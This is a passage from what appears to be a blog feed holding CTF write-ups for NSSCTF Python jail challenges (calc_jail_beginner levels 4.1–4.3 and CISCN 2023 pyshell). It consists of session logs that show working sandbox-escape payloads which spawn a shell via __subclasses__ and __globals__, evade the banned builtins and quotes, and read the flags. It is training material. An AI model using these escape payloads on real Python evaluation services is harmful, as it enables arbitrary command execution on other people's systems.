punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">nc node5<span class="token punctuation">.</span>anna<span class="token punctuation">.</span>nssctf<span class="token punctuation">.</span>cn <span class="token number">28800</span>  _                _                           _       _ _   _                _ _  _  __ <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token punctuation">(</span>_<span class="token punctuation">)</span>                         <span class="token punctuation">(</span>_<span class="token punctuation">)</span>     <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span>_ <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> _____   _____<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token string">'_ \ / _ \/ _` | | '</span>_ \<span class="token operator">|</span> <span class="token string">'_ \ / _ \ '</span>__<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _ \ \ <span class="token operator">/</span> <span class="token operator">/</span> _ \ <span class="token operator">|</span>__   _<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span>\ V <span class="token operator">/</span>  __<span class="token operator">/</span> <span class="token operator">|</span>  <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">.</span>__<span class="token operator">/</span> \___<span class="token operator">|</span>\__<span class="token punctuation">,</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span> \_<span class="token operator">/</span> \___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token operator">|</span>_<span class="token punctuation">(</span>_<span class="token punctuation">)</span>_<span class="token operator">|</span>              __<span class="token operator">/</span> <span class="token operator">|</span>                          _<span class="token operator">/</span> <span class="token operator">|</span>             <span class="token operator">|</span>___<span class="token operator">/</span>                          <span class="token operator">|</span>__<span class="token operator">/</span>Welcome to the python jailLet's have an beginner jail of calcEnter your expression <span class="token keyword">and</span> I will evaluate it <span class="token keyword">for</span> you<span class="token punctuation">.</span>Banned __loader__<span class="token punctuation">,</span><span class="token builtin">__import__</span><span class="token punctuation">,</span><span class="token builtin">compile</span><span class="token punctuation">,</span><span class="token builtin">eval</span><span class="token punctuation">,</span><span class="token keyword">exec</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">,</span><span class="token builtin">input</span><span class="token punctuation">,</span><span class="token builtin">locals</span><span class="token punctuation">,</span><span class="token builtin">globals</span><span class="token punctuation">,</span><span class="token builtin">bytes</span> <span class="token keyword">and</span> `<span class="token punctuation">,</span>"<span class="token punctuation">,</span>' Good luck!<span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">:</span> can't access tty<span class="token punctuation">;</span> job control turned off$ cat flagcat<span class="token punctuation">:</span> flag<span class="token punctuation">:</span> No such <span class="token builtin">file</span> <span class="token keyword">or</span> directory$ lsflag_y0u_CaNt_FiNd_mE  server<span class="token punctuation">.</span>py$ cat flag_y0u_CaNt_FiNd_mEflag<span class="token operator">=</span>NSSCTF<span class="token punctuation">&#123;</span>d68bd386<span class="token operator">-</span>1f8c<span class="token operator">-</span>4a42<span class="token operator">-</span>83a7<span class="token operator">-</span>077253f3bfb7<span class="token punctuation">&#125;</span>$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="calc_jail_beginner_level42"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level42"></a> calc_jail_beginner_level4.2</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">nc node5<span class="token punctuation">.</span>anna<span class="token punctuation">.</span>nssctf<span class="token punctuation">.</span>cn <span class="token number">28502</span>  _                _                           _       _ _   _                _ _  _   ___ <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token punctuation">(</span>_<span class="token punctuation">)</span>                         <span class="token punctuation">(</span>_<span class="token punctuation">)</span>     <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>__ \ <span class="token operator">|</span> <span class="token operator">|</span>__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> _____   _____<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token operator">|</span>_   <span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token string">'_ \ / _ \/ _` | | '</span>_ \<span class="token operator">|</span> <span class="token string">'_ \ / _ \ '</span>__<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _ \ \ <span class="token operator">/</span> <span class="token operator">/</span> _ \ <span class="token operator">|</span>__   _<span class="token operator">|</span> <span class="token operator">/</span> <span class="token operator">/</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span>\ V <span class="token operator">/</span>  __<span class="token operator">/</span> <span class="token operator">|</span>  <span class="token operator">|</span> <span class="token operator">|</span>_ <span class="token operator">/</span> <span class="token operator">/</span>_ <span class="token operator">|</span>_<span class="token punctuation">.</span>__<span class="token operator">/</span> \___<span class="token operator">|</span>\__<span class="token punctuation">,</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span> \_<span class="token operator">/</span> \___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token operator">|</span>_<span class="token punctuation">(</span>_<span class="token punctuation">)</span>____<span class="token operator">|</span>              __<span class="token operator">/</span> <span class="token operator">|</span>                          _<span class="token operator">/</span> <span class="token operator">|</span>             <span class="token operator">|</span>___<span class="token operator">/</span>                          <span class="token operator">|</span>__<span class="token operator">/</span>Welcome to the python jailLet's have an beginner jail of calcEnter your expression <span class="token keyword">and</span> I will evaluate it <span class="token keyword">for</span> you<span class="token punctuation">.</span>Banned __loader__<span class="token punctuation">,</span><span class="token builtin">__import__</span><span class="token punctuation">,</span><span class="token builtin">compile</span><span class="token punctuation">,</span><span class="token builtin">eval</span><span class="token punctuation">,</span><span class="token keyword">exec</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">,</span><span class="token builtin">input</span><span class="token punctuation">,</span><span class="token builtin">locals</span><span class="token punctuation">,</span><span class="token builtin">globals</span><span class="token punctuation">,</span>byte <span class="token keyword">and</span> `<span class="token punctuation">,</span>"<span class="token punctuation">,</span>'<span class="token punctuation">,</span><span class="token operator">+</span> Good luck!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一种方法还是之前bytes被ban的情况。</p><p>另一中方法则是使用doc函数</p><p>但是由于+以及’被ban了可以先用join方法，然后用str()来绕过’</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">nc node5<span class="token punctuation">.</span>anna<span class="token punctuation">.</span>nssctf<span class="token punctuation">.</span>cn <span class="token number">28502</span>  _                _                           _       _ _   _                _ _  _   ___ <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token punctuation">(</span>_<span class="token punctuation">)</span>                         <span class="token punctuation">(</span>_<span class="token punctuation">)</span>     <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>__ \ <span class="token operator">|</span> <span class="token operator">|</span>__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> _____   _____<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token operator">|</span>_   <span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token string">'_ \ / _ \/ _` | | '</span>_ \<span class="token operator">|</span> <span class="token string">'_ \ / _ \ '</span>__<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _ \ \ <span class="token operator">/</span> <span class="token operator">/</span> _ \ <span class="token operator">|</span>__   _<span class="token operator">|</span> <span class="token operator">/</span> <span class="token operator">/</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span>\ V <span class="token operator">/</span>  __<span class="token operator">/</span> <span class="token operator">|</span>  <span class="token operator">|</span> <span class="token operator">|</span>_ <span class="token operator">/</span> <span class="token operator">/</span>_ <span class="token operator">|</span>_<span class="token punctuation">.</span>__<span class="token operator">/</span> \___<span class="token operator">|</span>\__<span class="token punctuation">,</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span> \_<span class="token operator">/</span> \___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token operator">|</span>_<span class="token punctuation">(</span>_<span class="token punctuation">)</span>____<span class="token operator">|</span>              __<span class="token operator">/</span> <span class="token operator">|</span>                          _<span class="token operator">/</span> <span class="token operator">|</span>             <span class="token operator">|</span>___<span class="token operator">/</span>                          <span class="token operator">|</span>__<span class="token operator">/</span>Welcome to the python jailLet's have an beginner jail of calcEnter your expression <span class="token keyword">and</span> I will evaluate it <span class="token keyword">for</span> you<span class="token punctuation">.</span>Banned __loader__<span class="token punctuation">,</span><span class="token builtin">__import__</span><span class="token punctuation">,</span><span class="token builtin">compile</span><span class="token punctuation">,</span><span class="token builtin">eval</span><span class="token punctuation">,</span><span class="token keyword">exec</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">,</span><span class="token builtin">input</span><span class="token punctuation">,</span><span class="token builtin">locals</span><span class="token punctuation">,</span><span class="token builtin">globals</span><span class="token punctuation">,</span>byte <span class="token keyword">and</span> `<span class="token punctuation">,</span>"<span class="token punctuation">,</span>'<span class="token punctuation">,</span><span class="token operator">+</span> Good luck!<span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">86</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">:</span> can't access tty<span class="token punctuation">;</span> job control turned off$ lsflag_y0u_CaNt_FiNd_mE  server<span class="token punctuation">.</span>py$ cat flag_y0u_CaNt_FiNd_mEflag<span class="token operator">=</span>NSSCTF<span class="token punctuation">&#123;</span>2ebbdbce<span class="token operator">-</span><span class="token number">3567</span><span class="token operator">-</span><span class="token number">4357</span><span class="token operator">-</span>a156<span class="token operator">-</span>0662bfbbf67c<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="calc_jail_beginner_level43"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level43"></a> calc_jail_beginner_level4.3</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">nc node5<span class="token punctuation">.</span>anna<span class="token punctuation">.</span>nssctf<span class="token punctuation">.</span>cn <span class="token number">28754</span>  _                _                           _       _ _   _                _ _  _   ____ <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token punctuation">(</span>_<span class="token punctuation">)</span>                         <span class="token punctuation">(</span>_<span class="token punctuation">)</span>     <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>___ \ <span class="token operator">|</span> <span class="token operator">|</span>__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> _____   _____<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token operator">|</span>_  __<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token string">'_ \ / _ \/ _` | | '</span>_ \<span class="token operator">|</span> <span class="token string">'_ \ / _ \ '</span>__<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _ \ \ <span class="token operator">/</span> <span class="token operator">/</span> _ \ <span class="token operator">|</span>__   _<span class="token operator">|</span><span class="token operator">|</span>__ <span class="token operator">&lt;</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span>\ V <span class="token operator">/</span>  __<span class="token operator">/</span> <span class="token operator">|</span>  <span class="token operator">|</span> <span class="token operator">|</span>_ ___<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">.</span>__<span class="token operator">/</span> \___<span class="token operator">|</span>\__<span class="token punctuation">,</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span> \_<span class="token operator">/</span> \___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token operator">|</span>_<span class="token punctuation">(</span>_<span class="token punctuation">)</span>____<span class="token operator">/</span>              __<span class="token operator">/</span> <span class="token operator">|</span>                          _<span class="token operator">/</span> <span class="token operator">|</span>             <span class="token operator">|</span>___<span class="token operator">/</span>                          <span class="token operator">|</span>__<span class="token operator">/</span>Welcome to the python jailLet's have an beginner jail of calcEnter your expression <span class="token keyword">and</span> I will evaluate it <span class="token keyword">for</span> you<span class="token punctuation">.</span>Banned __loader__<span class="token punctuation">,</span><span class="token builtin">__import__</span><span class="token punctuation">,</span><span class="token builtin">compile</span><span class="token punctuation">,</span><span class="token builtin">eval</span><span class="token punctuation">,</span><span class="token keyword">exec</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">,</span><span class="token builtin">input</span><span class="token punctuation">,</span><span class="token builtin">locals</span><span class="token punctuation">,</span><span class="token builtin">globals</span><span class="token punctuation">,</span><span class="token builtin">bytes</span><span class="token punctuation">,</span><span class="token builtin">open</span><span class="token punctuation">,</span><span class="token builtin">type</span> <span class="token keyword">and</span> `<span class="token punctuation">,</span>"<span class="token punctuation">,</span>'<span class="token punctuation">,</span><span class="token operator">+</span> Good luck!<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>依然可以用上面的payload。</p><h4 id="ciscn-2023-初赛pyshell"><a class="markdownIt-Anchor" href="#ciscn-2023-初赛pyshell"></a> [CISCN 2023 初赛]pyshell</h4><p>有长度限制，使用’__'进行字符串拼接</p><p>python中_表示上次计算结果，因此可以进行_进行字符串拼接</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"> nc node5<span class="token punctuation">.</span>anna<span class="token punctuation">.</span>nssctf<span class="token punctuation">.</span>cn <span class="token number">28841</span> __        ___             ____          ____            _ \ \      <span class="token operator">/</span> <span class="token operator">/</span> <span class="token operator">|</span>__  _   _  <span class="token operator">/</span> ___<span class="token operator">|</span>  ___   <span class="token operator">/</span> ___<span class="token operator">|</span>  ___ _ __<span class="token punctuation">(</span>_<span class="token punctuation">)</span> ___  _   _ ___  \ \ <span class="token operator">/</span>\ <span class="token operator">/</span> <span class="token operator">/</span><span class="token operator">|</span> <span class="token string">'_ \| | | | \___ \ / _ \  \___ \ / _ \ '</span>__<span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _ \<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">/</span> __<span class="token operator">|</span>   \ V  V <span class="token operator">/</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>  ___<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>  ___<span class="token punctuation">)</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token operator">|</span>  <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> \__ \    \_<span class="token operator">/</span>\_<span class="token operator">/</span>  <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\__<span class="token punctuation">,</span> <span class="token operator">|</span> <span class="token operator">|</span>____<span class="token operator">/</span> \___<span class="token operator">/</span>  <span class="token operator">|</span>____<span class="token operator">/</span> \___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">/</span> \__<span class="token punctuation">,</span>_<span class="token operator">|</span>___<span class="token operator">/</span>                   <span class="token operator">|</span>___<span class="token operator">/</span>        CISCN <span class="token number">2023</span> Misc<span class="token operator">-</span>Pyshell Rewriten by Randark_JMTWelcome to this python shell<span class="token punctuation">,</span><span class="token keyword">try</span> to find the flag!<span class="token operator">>></span><span class="token string">'/flag'</span><span class="token string">'/flag'</span><span class="token operator">>></span><span class="token builtin">open</span><span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">&lt;</span>_io<span class="token punctuation">.</span>TextIOWrapper name<span class="token operator">=</span><span class="token string">'/flag'</span> mode<span class="token operator">=</span><span class="token string">'r'</span> encoding<span class="token operator">=</span><span class="token string">'UTF-8'</span><span class="token operator">></span><span class="token operator">>></span>_<span class="token punctuation">.</span>read <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> method read of _io<span class="token punctuation">.</span>TextIOWrapper <span class="token builtin">object</span> at <span class="token number">0x7f6764267d30</span><span class="token operator">></span><span class="token operator">>></span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">)</span> Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>  File <span class="token string">"&lt;stdin>"</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>TypeError<span class="token punctuation">:</span> bad operand <span class="token builtin">type</span> <span class="token keyword">for</span> unary <span class="token operator">-</span><span class="token punctuation">:</span> <span class="token string">'tuple'</span><span class="token operator">>></span>_<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token string">'NSSCTF&#123;f78c6786-daf3-41a2-a6d8-a746d4c5b1d2&#125;\n'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GETH 搭建私链</title>
      <link href="/2023/10/24/GETH-%E6%90%AD%E5%BB%BA%E7%A7%81%E9%93%BE/"/>
      <url>/2023/10/24/GETH-%E6%90%AD%E5%BB%BA%E7%A7%81%E9%93%BE/</url>
      
